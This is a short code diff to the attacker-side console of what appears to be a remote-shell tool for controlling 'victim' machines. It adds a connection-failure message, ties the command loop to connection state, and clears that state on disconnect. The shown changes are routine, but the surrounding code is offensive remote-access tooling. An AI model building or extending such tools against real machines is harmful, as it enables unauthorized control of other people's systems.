@@ -70,9 +70,11 @@ class RemoteShellAttackerSide:
         if packet.packet_type == PacketType.GENERAL.value:
             if packet.packet_sub_type == GeneralPacketType.ACK.value:
                 self.is_connected = True
+        else:
+            print('connection failed')
 
     def __admin_input(self):
-        while True:
+        while self.is_connected:
             if not self.mutex.locked():
                 print(f'{self.victim_info} {self.victim_cwd.split("/")[-1]} $ ', end='')
                 command = input()
@@ -97,6 +99,7 @@ class RemoteShellAttackerSide:
         packet = RemoteShellPacket(RemoteShellPacketType.EXIT, payload=PacketConstants.NO_DATA)
         SendPacket.send_packet(self.victim_socket, packet)
         print(f"Disconnecting, {self.victim_socket}")
+        self.is_connected = False
 
     def __print_in_light_blue(self, st: str):
         print('\33[94m' + st + '\33[0m', end='')
